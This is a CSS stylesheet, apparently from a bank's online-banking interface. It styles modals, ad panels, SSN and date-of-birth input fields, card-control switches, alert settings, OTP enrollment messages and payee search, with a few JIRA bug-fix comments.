.medium_Ad { margin: 0 0 15px 0; border: 1px dotted #D7D7D7!important;background:#ffffff; }
.medium_Ad .RUIFW-col-5 { vertical-align: bottom!important; text-align: center; }
.medium_Ad .RUIFW-btn-primary { vertical-align: bottom!important; margin: 25px; }
.rightlinks_ad { margin: 0 0 15px 0; border: 1px dotted #D7D7D7!important; padding-top: 10px; padding-bottom: 15px; background:#ffffff;}
.rightlinks_ad h4 { margin-top: 0px }
.modal_ad { text-align: center; margin-top: 25px; border: 1px dotted #D7D7D7!important; margin-left: 0; margin-right: 0; background:#ffffff;}
.modal_ad div { padding-top: 15px; padding-bottom: 25px; }
.marketingPage {background:#ffffff; }
.marketingPage img { max-width: 100%; height: auto; }
.offersPage {background:#ffffff;}
.offersPage img { max-width: 100%; height: auto;}
.DOB1 { width: 16%!important }
.DOB2 { width: 22%!important }
.SSN1 { width: 19%!important }
.SSN2 { width: 31%!important }
.SSN3 { width: 13%!important }
.bill_modal{max-width:800px; height:height: 518px; margin:50px auto 0 auto; }
#scrollable-dropdown-menu .tt-dropdown-menu { max-height: 150px; overflow-y: auto; }
.nowrap_month{ white-space:nowrap!important;}
.nowrap_month .form-control{  display: inline-block!important;  vertical-align: top;}
.monthstyle{ font-weight:normal; display:inline-block!important; vertical-align:top!important; padding-top:5px;}
.security_phrase{white-space:pre-wrap!important;word-wrap:break-word!important;width:100%!important; max-width: 100%!important;}
fieldset.RUIFW-inline{white-space:inherit!important;}
fieldset.RUIFW-inline .radio,fieldset.RUIFW-inline .radio label{white-space:nowrap!important;}
.modal.RUIFW-print-view .modal-header .modal-title{ margin-top:-5px!important;}
.modal.RUIFW-print-view .modal-header .btn-primary{ margin-right:10px;}
.modal.RUIFW-print-view .modal-body .accnt-act-details2{display:none!important;}
.modal.RUIFW-print-view .modal-body .accnt-act-details1{border: 1px solid #D7D7D7!important; padding:10px;}
.image_100{    max-width: 100%!important;    height: auto!important; width:100%;  }
input[type='radio']{   background:none; vertical-align:top; margin-top:5px;}
.radio_100 tr td{max-width: 100%!important;width:100%; white-space:nowrap; vertical-align:top;  }
.radio_100 tr td input{vertical-align:top;  }
.radio_100 tr td label{ display:inline-block; font-weight:normal; margin:0 0 0 5px; vertical-align:top; }
*[class*="RUIFW-inline"] .radio input[type="radio"]{top: -3px;}
*[class*="RUIFW-inline"] .checkbox input[type="checkbox"]{top: 3px;}
fieldset.RUIFW-inline .checkbox{margin-top:5px;}

@media screen {
.noprint {display: block;}
#printHeader, #printFooter, #printHeaderTable, #transactionDetails{display:none!important;}
#headerData_pabp_dispute{display: none!important;}
#headerData_pabp{display: none!important;}
#headerData_pabp_create{display: none!important;}
#headerData_pabp_cancel{display: none!important;}

}

 @media only screen 
  and (max-width: 960px)  {	  
	  .main-icons,.main-icons > ul >li {display: table-cell; float:none !important; background: #d81e05; }
	  .main-icons{padding-left:6px; }
	  .RUIFW-nav-main > li > a {padding:12px 6px 12px 6px!important;}
	  .RUIFW-nav-main {padding-left: 2px !important;}
	  .main-icons li .dropdown-menu { position: absolute; left: inherit !important; right: inherit !important; margin-left: -10px; }

}

/* RUIFW-calculator */
.RUIFW-calculator {   background:#EFEFEF; width: 250px !important; border:1px solid #ccc; box-shadow:1px 1px 4px #EEEEEE; border-radius:5px; padding: 35px 8px 8px 8px; position: absolute; z-index: 9999;height: 270px !important; max-height: 300px !important;display:none;}
.RUIFW-calculator #calculator-field{background: #fff; -webkit-box-shadow: none;  box-shadow: none; text-align: right; border-color: #ccc; cursor:default;}
.calc-getnumber-field{visibility: hidden; height: 0px; width: 0px; overflow: hidden;}
.RUIFW-calculator-input { height: 42px;  font-size: 42px; line-height: 35px;  width: 100%;  background:#FFF; }
.RUIFW-calculator-keys {padding: 5px 0 0 0;}
.RUIFW-calculator-keys > .row-fluid > button {margin: 4px 2px;  width: 51px;}
.RUIFW-calculator-keys > .row-fluid:last-child{text-align: right;}
.RUIFW-calculator-keys > .row-fluid > button.btn-primary {margin: 4px 2px;  width: 108px;}
.RUIFW-calculator > .RUIFW-calculator-head { cursor: move; width: 100%; height: 20px; margin: -30px 0 10px 0;}

/* CMS Styles */
.marketing-link a{color:#2a5db0 !important;}
.marketing-link a:before{content:"";}
.marketing-link p{margin:0;}

/* CSS for Leap Phase 2 Applications start */
/* optimized for 1280x800 screens */
.termsandconditionsWrap{height: 363px;overflow: auto;background: #fff none repeat scroll 0 0;padding: 10px; width:100%}
/* .modal-body-wrapper{max-height:330px; overflow:auto;} */
.txt-ctr{text-align:center !important}
#targetMarketingModalWindow{margin-top:40px;}
#RUIFW-print-terms-modal .modal-dialog{width:770px !important; padding:0;}
#RUIFW-print-terms-modal .modal-content{ background:#ebebeb; border-radius:6px;}
/** chnages for low resolution*/
#targetMarketingModalWindow .modal-dialog {width: 750px; min-height:217px}
#targetMarketingModalWindow .modal-content{ border-radius:6px;}
#targetMarketingModalWindow .modal-header{padding:15px 15px 0 30px;}
#termsAndConditionsErr {float:left;width:60%;margin-top: -5px;  margin-left: -15px;}
.modal.RUIFW-print-view .modal-header .modal-title{ width:90%; color:#d81e05}
#targetMarketingModalWindow h6 {margin: 8px auto; font-size: 18px;}
.font16{font-size:16px;}
#RUIFW-print-terms-modal .modal-dialog {margin-top:180px;}
.mrgn-top-30{margin-top:30px;}
.mrgn-top-60{margin-top:60px;}
.printTermsFooterDisplay {display:none}
.box-hr-separator6 { border-top: 1px dotted #d7d7d7; margin: 20px 0 25px 0; height: 1px; width: 100%; }
.mrgn-top-minus40 { margin-top: -40px !important }
.mainWrap{padding:25px;  margin-bottom:0px;}
.pad-left-50{padding-left:50px;}
.download-print-button {position:absolute; bottom:58px; left:48px;}
#RUIFW-print-terms-modal .modal-footer{padding:10px 0px 25px}
.leftWrapper{float:left;margin:0 7px 0 0; padding:0;border: 1px solid #d8d8d8}
.addinfo-err-msg{float:left;margin-top:5px;color:#D81E05;}
.leftWrapper input{margin-top:0px;}
#campaignForm .modal, #RUIFW-print-terms-modal {text-align: center;padding: 0!important; margin-top:0px;}
#campaignForm .modal:before, #RUIFW-print-terms-modal:before {content: '';display: inline-block;vertical-align: middle;margin-right: -4px; margin-top:0px; height:100%;}
#ActSumryTimeOut.modal:before{height:auto !important; }

/* begin Digital Sales ripple application form */
#cancelOfferModal .RUIFW-modal-header.modal-header > img { height: 20px; }
#cancelOfferModal .RUIFW-modal-header.modal-header { padding: 22px 25px 0px 25px; }
#cancelOfferModal .RUIFW-modal-content.modal-content { width: 492px; height: 189px; border-radius: 4px; }
#cancelOfferModal .RUIFW-modal-body.modal-body { padding: 28px 30px 13px 30px; }
#cancelOfferModal .RUIFW-btn, #cancelOfferModal a { padding: 3px 30px; }
/* end Digital Sales ripple application form */


/* begin sales deposit account */
.overview-table .sales-da-entry-point { margin-bottom: 15px; border: 0.5pt solid #e2e2e2; }
.overview-table tr.sales-da-entry-point > td { background-color: #F5F5F5; white-space: normal !important; padding-top: 10px !important; padding-bottom: 10px !important;}
.overview-table .sales-da-entry-point td.account-type > a { width: 185%; }
.overview-table .sales-da-entry-point .sales-da-entry-point-title { font-weight: bold; color: #d81e05; font-size: 16px; line-height: 20px; }
.overview-table .sales-da-entry-point .sales-da-entry-point-subtitle { letter-spacing: 0.3px; color: #606060; font-size: 13px; line-height: 18px; }
.overview-table .sales-da-entry-point:hover .sales-da-entry-point-subtitle { color: #606060 }
.overview-table .sales-da-entry-point:hover .sales-da-entry-point-title { color: #A6000E }
.overview-table .sales-da-entry-point .add-icon { 
  background-image: url("../images/addIconHover.png");
  background-size: 20px;
  height: 20px;
  position: relative;
  top: 10px;
  width: 20px;
}
.overview-table .sales-da-entry-point .add-icon.disabled {
  background-image: url("../images/addIconHoverDisable.png");
}
/* end sales deposit account



/* JIRA bug IBDSS-194 
	scroll bar displayed on intercept page when timeout modal is dismissed 
	fix styling of intercept modal window */
/* #campaignForm .modal, #RUIFW-print-terms-modal, #ActSumryTimeOut {text-align: center;padding: 0!important; margin-top:0px;}
#campaignForm .modal:before, #RUIFW-print-terms-modal:before, #ActSumryTimeOut.modal:before {content: '';display: inline-block;vertical-align: middle;margin-right: -4px; margin-top:0px; height:100%;} 
 #ActSumryTimeOut.modal:before{height:auto !important; } 
#targetMarketingModalWindow .modal-dialog, #RUIFW-print-terms-modal .modal-dialog, #ActSumryTimeOut .modal-dialog {display: inline-block;text-align: left;vertical-align: middle;padding:0;margin:0 auto;max-height:100%;} */
#targetMarketingModalWindow, #RUIFW-print-terms-modal{text-align: center;padding: 0!important; margin-top:0px;}
#targetMarketingModalWindow.modal:before, #RUIFW-print-terms-modal:before {content: '';display: inline-block;vertical-align: middle;margin-right: -4px; margin-top:0px; height:100%;}
/* end JIRA bug IBDSS-194 */

#targetMarketingModalWindow .modal-dialog, #RUIFW-print-terms-modal .modal-dialog {display: inline-block;text-align: left;vertical-align: middle;padding:0;margin:0 auto;max-height:100%;}

#targetMarketingModalWindow .prod-benefits-web { color: #606060; font-size: 14px; }
#targetMarketingModalWindow .prod-benefits-web-scrollable { overflow: auto; height: 387px; }
#targetMarketingModalWindow .prod-benefits-web .toggleProductBenefits { padding: 14px 10px 14px 10px; color: #2A5DB0; text-decoration: none; }
#targetMarketingModalWindow .prod-benefits-web .icon-angle-down { font-size: 20px; position:relative; top: 1px; padding: 0px 15px 0px 8px; }
#targetMarketingModalWindow .prod-benefits-web .icon-angle-up { font-size: 20px; position:relative; top: 1px; padding: 0px 15px 0px 8px; }
#targetMarketingModalWindow #productBenefitDetails { margin-top: -25px; padding-top: 20px;}
#targetMarketingModalWindow #productBenefitDetails ul li { margin-bottom: 10px}
#targetMarketingModalWindow #productBenefitDetails > div:first-child { margin: 0px 90px; }
#targetMarketingModalWindow #aunth_sect_btns a, #aunth_sect_btns #tellMeLaterButton { font-family: arial; font-size: 14px; line-height: 16px; text-align: center; border-radius: 4px; color: #FFFFFF;}
#aunth_sect_btns #tellMeLaterButton { padding: 10px 15px; height: 38px; }
#targetMarketingModalWindow .toggleProductBenefits .icon-angle-down, .icon-angle-up {font-size: 20px; margin-left: 5px; position: relative; top: 2px;}
#targetMarketingModalWindow .prod-benefits-mob-title{ font-family: Arial; font-style: normal; font-weight: bold; font-size: 14px; line-height: 16px; color: #606060; margin-bottom: 10px}
#targetMarketingModalWindow .prod-benefits-web-title { color: #333333; margin-bottom: 25px; }
#targetMarketingModalWindow .prod-benefits-web ul { padding-left: 17%; padding-right: 17%; }
#targetMarketingModalWindow .prod-benefits-web li::before{ content: ''; position: absolute; left: -10px; top: 5px; height: 12px; width: 15px; background-image: url(../../mobile/images/red-tick.svg); }
#targetMarketingModalWindow .prod-benefits-web li { list-style-type: none; position: relative; padding: 0px 0px 25px 20px; }


/* JIRA bug IBDSS-189
	fix issue where timeout dialog is hidden behind any existing modal dialogs
	override MCAC styles to retain LEAP standard styles */
#ActSumryTimeOut.modal:before{vertical-align:top; }
#ActSumryTimeOut .modal-dialog{width:600px !important; margin-top:120px; padding-top:10px }
#ActSumryTimeOut .modal-content{border-radius:0; border:1px solid rgba(0, 0, 0, .2)}
/* end JIRA bug IDSS-189 */

.mainWrap label{font-weight:normal; margin:0;}
a.dwn-button{float: left;background: #606060;padding:3px 15px 4.81px;border-radius: 4px;color: #fff; cursor: pointer; font-size:1.4rem;}
a.dwn-button:hover{color:#fff;}
#infoView .leftWrapper { border: 0;}
#infoView .grey-box2 {width:99%}

.acceptWrap{margin-bottom:20px; float:left; width:100%;}
.acceptBox input{position:relative; top:2px;}
.btn-holder a.mrgn0{margin:0 !important;}
.btn-holder a.mrgn-lft-3{ margin-left:3px !important;}
#RUIFW-print-terms-modal .close_icon{position:absolute; top:25px; right:15px;}
.mrgn-space{margin:0 0 25px 25px;}
.font11{font-size:11px;}
.mrgn-top-minus25{margin-top:-25px;}

.modal-open, .modalPrint { overflow: auto; overflow-x: hidden; overflow-y: hidden;}

.modal-open {    overflow: auto;    overflow-x: hidden;    overflow-y: hidden;}
#targetMarketingModalWindow .modal-header{padding:15px 15px 0 30px;}
#targetMarketingModalWindow h6{ font-size:16px; margin:8px 0}
.acceptWrap{margin-bottom:20px; }
#targetMarketingModalWindow .modal-footer{padding:10px 20px 30px;}

/**
  Changes for Low Resolution in Intercept starts
**/
@media screen and (max-width: 1024px) { 
#targetMarketingModalWindow .modal-dialog{width:490px; height:auto !important;}
#targetMarketingModalWindow .modal-title img{width:120px;}
.modal-body-wrapper img{width:450px; height:191px;}
#targetMarketingModalWindow h1{font-size:20px;}
#targetMarketingModalWindow h6{font-size:14px;}
.font16{font-size:14px;}
#targetMarketingModalWindow .prod-benefits-web { font-size: 12.5px !important; }
#targetMarketingModalWindow .prod-benefits-web-scrollable { height: 273px; }
.pad-left-50{padding-left:0;}
a#learnMoreLink, .acceptWrap, #termsAndConditionsErr{font-size:10px;}
.btn-holder button, .btn-holder input, .btn-holder a{font-size:12px;}
.acceptWrap{margin-bottom:25px;}
} 
/**
  Changes for Low Resolution in Intercept end
**/

/* CSS for Leap Phase 2 Applications end */

/* CSS for Leap Phase 2 - Selfhelp Start */
.selfHelpModal p{font-size:13px;margin:0 0px 0px 15px}
.selfHelpModal .modal-title{background:#D81E05; color:#fff; font-size:24px; padding:10px 20px;}
.selfHelpModal .modal-header{padding:0}
.selfHelpModal .modal-title span{margin-top:5px;}
.selfHelpModal .modal-header .close-btn { color: #fff; position:absolute; right:20px; top:13px; background:transparent; border:1px solid #fff; width:81px; height:30px; border-radius:4px; font-size:14px;}
.selfHelpModal label{font-weight:normal; font-size:16px; margin-bottom:15px;}
.selfHelpModal .modal-body{padding:30px;min-height:508px;}
.selfHelpModal .modal-body h2{font-size:20px; color:#d81e05 !important; margin:0px 0 15px 0px; padding:0;}
.SHsearchBox .btn{padding: 4px 10px 5px;  background:#da1c05 url("../images/search-icon.png") no-repeat 12px 2px !important; width:38px; height:20px; display:block;margin:0px !important;border:none;outline:none }
.SHsearchBox .btn:hover{z-index:0;border:none;margin-left:0px;background-color:transparent !important;outline:none}
.selfHelpModal .input-group{margin:0px 0px 20px 0px;}
.SHsearchBox .input-group-btn {background:#da1c05; border-top-right-radius:4px; border-bottom-right-radius:4px}
.SHsearchBox .form-control{border-right:0; box-shadow:none; color:#606060; padding:0 10px}
.selfHelpModal .toggle-btn{background:#fff;}
.rhs-searchWrap-margin{ margin:0px 14px 0px 40px}
.top-dotted-line{border-top:1px dotted #c5c5c5; padding-top:15px; margin-top:8px;margin-bottom: 5px}
.msgHead{font-size:16px;margin-bottom: 10px;}
.mrgn-btm-12{margin-bottom:12px;}
.mrgn-btm-40{margin-bottom:40px;}
.asktxt{ margin:10px 0px 8px 40px; font-size:12px; }
.selfHelpModal .panel-default{border-bottom:0px solid #f1f1f1; border-top:none; border-left:none; border-right:none; box-shadow:none; margin:0 0 20px; }
.exp-accordion .in{padding:0 0 15px}
.exp-accordion h4 {margin:0 0 10px;}
.exp-accordion h4 a{padding: 0 0 0 14px;font-size:14px;display:block; margin-top:0;line-height: 18px;}
.exp-accordion h4 a:before { color: #2a5db0;margin: -2px 0 0 -15px;}
.arrow-on:before{ color: #d81e05 !important;content: "\f0da"; font-size: 16px;  font-family: fontAwesome; position:absolute; margin:1px 0 0 -14px}
.arrow-off:before{color: #d81e05 !important;content: "\f0d7";font-family: fontAwesome; font-size: 16px; position:absolute; margin:1px 0 0 -14px  }
.close-btn{background:#fff;  border: 0 none;  border-radius: 4px; padding: 4px 10px; position: absolute; right: 48px;top: 37px;}
.viewmore-btn{background: #fff !important; border: 0; width: 96px !important; text-align: center; margin: 0 auto; color:#2A5DB0; height: 30px;font-size:13px; outline:none;}
.viewmore-arrow{display: inline; margin:-8px 0 0 0px;  position: absolute; font-size:13px;color:#2A5DB0;}
.selfHelpModal .toggle-btn:after{font-size:16px;}
input.search-no-overlap {z-index: 0 !important;}
#timeOut {z-index:1046 !important;}
/****** Style Star Rating Widget *****/
.ratingWrap{float:left;margin-left:-87px; position:relative; margin-bottom: 20px}
.rate{position:absolute; left: 210px;  top: 2px;width:100px}
.starRating:not(old){  display : inline-block; width : 100%;height: 1.5em;overflow:hidden;vertical-align:bottom;}
.starRating:not(old) > input{ margin-right : -100%; opacity : 0;}
.starRating:not(old) > label{display: block;float: right;position:relative;background: url('../images/star-icon.png'); background-size:contain; height:15px; width:15px; margin-right:5px;}
.starRating:not(old) > label:before{content : '';display : block;width: 15px;height:15px;background : url('../images/star-icon-hover.png');  background-size : contain; opacity : 0; transition: opacity 0.2s linear; margin-right:5px;}
.starRating:not(old) > label:hover:before,.starRating:not(old) > label:hover ~ label:before,.starRating:not(:hover) > :checked ~ label:before{ opacity : 1;}

/*******SelfHelp MVP2 Styles****************/
h4.exactMatchSingle{ font-size:14px; color:#606060; text-decoration:none;}
.suggestMatchLink {display:table;font-size:14px !important; margin:0 0 10px;color: #2a5db0; text-decoration:none;line-height: 16px;}
.msgHead1{font-size:14px;margin-bottom: 15px;}

/*******SelfHelp MVP2 Isuggest Styles -Start****************/
.ui-helper-hidden {	display: none; }
.ui-helper-hidden-accessible {border: 0;clip: rect(0 0 0 0);height: 1px;margin: -1px;overflow: hidden;padding: 0;position: absolute;width: 1px;}

.ui-widget-content {border: 1px solid #a6c9e2;background: #fcfdfd 50% bottom repeat-x;color: #222222;}
.ui-widget {font-family: Lucida Grande,Lucida Sans,Arial,sans-serif;font-size: 1.1em;}
.ui-menu {list-style: none;padding: 2px;margin: 0; display: block; outline: none;}
.ui-autocomplete {position: absolute;top: 0;left: 0;cursor: default;}
.ui-front {z-index: 100;}
.ui-menu .ui-menu-item {margin: 0;padding: 0;width: 100%;}
.ui-menu .ui-menu-item a {text-decoration: none;display: block;padding: 2px 15px 3px 15px;line-height: 16px;}
.ui-widget-content a {color: #606060;}

/* .ui-state-hover,
.ui-widget-content .ui-state-hover,
.ui-widget-header .ui-state-hover,
.ui-state-focus,
.ui-widget-content .ui-state-focus,
.ui-widget-header .ui-state-focus {	background: #F1F1F1;color: #2A5DB0 !important;} */

.ui-state-hover a,
.ui-state-hover a:hover,
.ui-state-hover a:link,
.ui-state-hover a:visited,
.ui-state-focus a,
.ui-state-focus a:hover,
.ui-state-focus a:link,
.ui-state-focus a:visited {	background: #F1F1F1;	color: #2A5DB0 !important;}
/*******SelfHelp MVP2 Isuggest Styles -Start****************/

/* CSS for Leap Phase 2 - Selfhelp  End*/
#messages p{margin:0}
/*** CSS for Prefill**/
.prefilled-card-sales-banner{padding: 10px 10px 10px 20px;border-top:1px dotted #D7D7D7;}
.prefilled-card-sales-banner .row div{display: table-cell; vertical-align: middle; float:none;}
/* JIRA bug IBDSS-529 mega menu banner image getting cropped */
.megamenu-prefilled-card-sales-banner{margin-top: -15px;}
.megamenu-prefilled-card-sales-banner{width:90% !important;}


/*----------------- Caribbean Alerts & Controls -------------------*/
.radio-component td{white-space: nowrap; padding: 0 25px 0 0; }
.radio-component td label{display: inline-block; font-weight:normal; margin:2px 0 0 2px;}
.radio-component td input{margin: 3px 5px 0 0;}


.card-controls-table .RUIFW-tooltip{margin-left: -5px !important; }
.card-controls-table > thead > tr > th{vertical-align: middle;}
.card-controls-table > thead > tr > th.status{width: 15%;}
.card-controls-table > thead > tr > th.auth-limit{width: 20%;}
.card-controls-table > thead > tr > th.trans{width: 20%;}
.card-controls-table > thead > tr > th.cc{width: 45%;}
.card-controls-table > tbody > tr > td{white-space: normal; vertical-align: middle; padding:25px 5px 25px 5px;}
.card-controls-table > tbody > tr > td.trans label{font-weight: normal; padding-left:15px;}
.card-controls-table > tbody > tr > td:first-child{text-align: left;}
.card-controls-table.v3 > tbody > tr > td:last-child{text-align: left; white-space: normal !important;}
.card-controls-table > tbody > tr > td .card-number{margin-top:10px;}
.card-controls-table > tbody > tr > td .cc-img{padding-left:0; }
.card-controls-table > tbody > tr > td .cc-number{padding-left:10px; }
.cc-error {background: url(../images/cc-error.png) left center no-repeat; padding: 0 0 0 30px; font-weight: bold; }
input[type=checkbox].cardControlSwitch {display:none;}
input[type=checkbox].cardControlSwitch + label {background: url(../images/Switch-OFF.svg) left center no-repeat; height: 34px; width: 60px;margin:5px 0 0 0; display:inline-block; padding: 0 0 0 0px;}
input[type=checkbox].cardControlSwitch:checked + label {background: url(../images/Switch-ON.svg) left center no-repeat; height: 34px; width: 60px;margin:5px 0 0 0; display:inline-block; padding: 0 0 0 0px;}
.cc-error {background: url(../images/cc-error.png) left center no-repeat; padding: 0 0 0 30px; font-weight: bold; white-space: normal}
.cc-preloader {background: url(../images/preloader.svg) center center no-repeat; height: 40px; width: 40px; padding: 0 0 0 0px; font-weight: bold; white-space: normal}

.info-notification,.mob-notification {padding:0 0 0 40px;}
.info-notification label,.mob-notification label{margin-bottom:0;}
.info-notification img{margin-left: -30px; margin-top: 2px; position: absolute;}
.info-notification img{margin-left: -30px; margin-top: 2px; position: absolute;}
.info-notification div {word-wrap: break-word;}


.email-notification,.mob-notification {padding:0 0 0 30px;}
.email-notification label,.mob-notification label{margin-bottom:0;}
.mob-alert-sms,.mob-alert-app{padding:0 0 10px 40px; }
.email-notification img{margin-left: -30px; margin-top: 2px; position: absolute;}
.mob-notification img{margin-left: -25px; position: absolute;}
.mob-alert-sms:before,.mob-alert-app:before{content: "-";position: absolute; margin-left: -10px;}
.email-notification span:first-of-type, .mob-notification span:first-of-type, .alerts-history-empty-desc, .alerts-settings-empty-desc{ margin-bottom: 0; font-weight: bold; color: #606060; font-size: 1.3rem; font-size: 13px; }
.email-notification div {word-wrap: break-word;}
.alerts-security-list { list-style-type:none; padding-left: 0 !important;}
.alerts-description-section { padding: 0px 0px 20px 0px; }
.alerts-delivery-options-label { margin-bottom: 16px; }

.exp-collapse.alerts-ui a {padding: 0 10px 10px 30px; font-size:14px;}
.exp-collapse.alerts-ui a:before{margin: -5px 0 0 -15px; position: absolute; left: 33px; }
.alertui-table.table > thead > tr > th {width: 15%; text-align: center; vertical-align: middle; }
.alertui-table.table > thead > tr > th:first-child {width: 70%; text-align: left; vertical-align: middle; }
.alertui-table.table .icon-envelope{font-size:15px; padding: 0;}
.alertui-table.table .icon-mobile-phone {font-size:25px !important ; padding: 0;}
.alertui-table.table > tbody > tr > td{vertical-align: middle; width: 15%; padding: 8px; white-space: normal;}
.alertui-table.table > tbody > tr > td:first-child{width: 70%;}
.alertui-table.table > tbody > tr > td:last-child{white-space: normal !important;}
.alertui-table.table > tbody > tr > td ul{margin-top: 8px;}
.alertui-table.table > tbody > tr > td li{margin-bottom: 5px;}
.alertui-table.table > tbody > tr > td.security-error-msg {padding: 0; border: 0; text-align:center;}
.alertui-table.table > tbody > tr > td.security-error-msg .error-msg {margin: 0 0 8px 0!important;}
.alertui-table.table > tbody > tr > td.accnt-act-details{padding: 20px;}
.alertui-table .alert-details td {background: #fbfbfb; }
.alert-details .alerts-expandedv-label{margin-top:6px;}
.alert-details .RUIFW-prepend > span {left: 3px;}
.alertui-table .radio label,.alertui-table .checkbox label {font-size: 12px;}
.alerts-details-fieldset { margin: 0 0 0 -15px; }
.alerts-threshold-amount-input { margin-left: -6px; }
.alerts-deliverable-accounts-list > tbody > tr > td { padding-bottom: 10px; }

.alerts-internal-container{max-height: 400px; overflow-x: hidden; overflow-y: auto; padding-bottom: 25px; }
.alerts-internal-container .exp-collapse a {display: block; padding-right: 15px; position: relative; }
.alerts-internal-container .exp-collapse a:after{content:" "; clear: both; display: table;}
.alerts-internal-container .exp-collapse a div.section-label {float: left; width: 69%; text-align: left;}
.alerts-internal-container .exp-collapse a div {float: right; width: 15.5%; text-align: center;}
.alerts-internal-container .RUIFW-inline label{white-space: normal !important;}
.freq-view-addtn-ip{padding-left: 73px;}

.floating-button-container{position:relative; margin: 20px -25px -25px -25px; }
.floating-button-container .note {position: relative;  z-index: 3;  margin: 0 auto -36px;   padding: 0 200px 0 50px; }
.floating-button-container .note img{position: absolute;    margin: -1px 0 0 -25px;}
.floating-button-container .buttons {position: absolute; z-index:3; margin-top:-25px; right:25px;}
.floating-button-container .buttons .btn {margin: 0 0 0 10px; min-width: 80px;}
.floating-button-container .buttons-bg{background: #f1f1f1; opacity: 0.9; width:100%; height: 50px;  z-index:2;}

.data-not-available {padding:15px; border: 1px solid #ddd;}
.data-not-available .empty-msg {font-weight: bold; margin-bottom: 5px;}
.data-not-available .empty-msg a {font-weight: normal;}

.disable-section, .disable-section input,.disable-section select{ pointer-events: none; opacity: 0.4; }

.wizard-form-content-for-web { padding: 15px 25px 25px 25px; background: #F1F1F1; }
.alerts-button-align {margin-top:25px;}

.alerthistory-table tr td:last-child{white-space: normal !important;}
.alerthistory-table{ margin-top: 15px;}
.alerthistory-table thead tr th,.alerthistory-table tbody tr td {padding:8px;}
.alerthistory-table tfoot tr td {padding:15px 8px 8px; background: #fff; border: none; }
.alerthistory-table td:first-child {white-space:nowrap !important;}
 #openpopupwindow {display:inline;}
.alerts_invalid_mobile_number{color:#d81e05;margin:0 0 5px 0;}
.alerts_invalid_mobile_number1{float:left;padding-left: 3px;}
.alerts_sg_text{font-weight: bold;color: #606060;font-size: 1.3rem;font-size: 13px;float: left;}
.alerts-sg-setup-mobile-number-description { margin-top: 5px; }
.alerts-sg-setup-form-content-margin-top { margin-top: 18px; }
.alerts-sg-setup-wizard-box-border-top { border-top: 1px solid #e0e0e0; }

.alerts-sg-setup-error-msg .error-msg { margin-left: 0px !important }
.txt-center_imp{text-align: center!important;}
.alerts_security_checkbox_alignment{text-align: center;padding: 0px 0px 0px 7px;}
.alerts_security_dropdown_alignment{padding: 0px 13px 0px 9px;}
.wrap-text{word-wrap: break-word;}

.wrap-text{word-wrap: break-word;}
.tptpanel{background: #E8E8E8;border: 1px solid #E4E4E4;border-radius: 4px;}
.tptinfoicon{position: absolute;margin: 15px 0 0 30px;}
.tptmsgcontainer{padding: 15px 15px 15px 60px;}


.whitebackground_message_frame{background: #FFFFFF;border-radius: 8px;border-radius: 8px; padding-top: 20px; padding-left: 20px; padding-right: 20px;}
.alert-icon-error-enrollment { background: url(../images/error-message.png) left center no-repeat; float:left;  width: 30px; height: 33px; margin-right: 20px!important;}
.otpErrorText { font-size: 16px;  color: #606060; letter-spacing: -0.15px; line-height: 20px; padding-top: 6px; padding-bottom: 25px;}
.otpText { font-size: 16px; color: #606060; padding-left: 10px; padding-top: 4px;}
.icon-lock-out-enrollment { background: url(../images/icon-lokcout-error.svg) left center no-repeat; float:left;  width: 57px; height: 69px; margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px}
.otpLockOutText { font-size: 20px;  color: #000000; letter-spacing: 0px; padding-top: 36px; padding-bottom: 36px;}
.icon-mail-missing-enrollment { background: url(../images/icon-warning.svg) left center no-repeat; float:left;  width: 60px; height: 60px; margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px}
.otpWarningText { font-size: 24px; color: #000000; letter-spacing: 0; padding-top: 20px; padding-bottom: 5px;  }
.otpWarningText2 { font-size: 16px; color: #333333; letter-spacing: 0;line-height: 25px; padding-right: 15px; padding-bottom: 20px; padding-left: 111px;}
.otpWelcomeHeader{font-size: 24px;  color: #333333; letter-spacing: 0px; line-height: 25px;}
.otpWelcomeDesc{font-size: 16px;  color: #333333; letter-spacing: 0px; line-height: 25px;}

.form-control::-webkit-input-placeholder { color: #BFBFBF; }
.form-control::-moz-placeholder { color: #BFBFBF; }
.form-control::-ms-input-placeholder { color: #BFBFBF; }
.form-control::-moz-placeholder { color: #BFBFBF; }

.leap-radio-wrapper { display: block; position: relative; padding-left: 35px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; margin-top: 15px; margin-bottom: 18px}
.leap-radio-act { position: absolute; opacity: 0; cursor: pointer; }
p.leap-radio { position: absolute; top: 0; left: 0; height: 24px; width: 24px; background-color: white; border-radius: 50%; border: 1px solid #757575; margin-top: 0px!important; margin-bottom: 0px!important; margin-right:  0px!important; margin-left:  0px!important;}
p.leap-radio2 { position: absolute; top: 0; left: 0; height: 24px; width: 24px; background-color: white; border-radius: 50%; border: 1px solid #757575; margin-top: 0px!important; margin-bottom: 0px!important; margin-right:  0px!important; margin-left:  0px!important;}
label.leap-radio-label{ max-width: fit-content!important; font-weight: normal !important; margin:0px; cursor: pointer;margin-top: 2px}
.leap-radio-act:checked~.leap-radio-label>.leap-radio {  background-color: #606060;  border: 1px solid #606060;}
.leap-radio-act:disabled~.leap-radio-label>.leap-radio { background-color: #c5c5c5; border: 1px solid #c5c5c5;}
.leap-radio-act:checked~.leap-radio-label>.leap-radio2 {  background-color: #606060;  border: 1px solid #606060;}
.leap-radio-act:disabled~.leap-radio-label>.leap-radio2 { background-color: #c5c5c5; border: 1px solid #c5c5c5;}
.leap-radio-act:disabled~.leap-radio-label { opacity: 0.75 }
.leap-radio:after { content: ""; position: absolute; display: none; }
.leap-radio2:after { content: ""; position: absolute; display: none; }
.leap-radio-act:checked~.leap-radio-label>.leap-radio:after { display: block; }
.leap-radio-act:checked~.leap-radio-label>.leap-radio2:after { display: block; }
.leap-radio-wrapper .leap-radio:after { top: 7px; left: 7px; width: 8px; height: 8px; border-radius: 50%; background: #ffffff; }
.leap-radio-wrapper .leap-radio2:after { top: 7px; left: 7px; width: 8px; height: 8px; border-radius: 50%; background: #ffffff; }
.loadMoreResultLink { color: #0000FF; margin-top: 25px; margin-left: 35px; }
.searchBox { background: url(../images/payee/search.svg) no-repeat; background-position: left; background-position-x: 5px; background-color: #FFF; padding-left: 26px; }
.borderNewPayeeName{ margin-right: -25px; margin-top: -25px; background: #DFDFDF; margin-left: -25px; }
.payeeMargin{ padding: 20px 0; margin-left: 40px; }
.payeeContent{ padding-top: 10px; }
.payeeLabels { font-size: 20px; font-weight: normal;}
.SearchNoMatch {font-weight: normal; margin-top: 15px; display:block;}

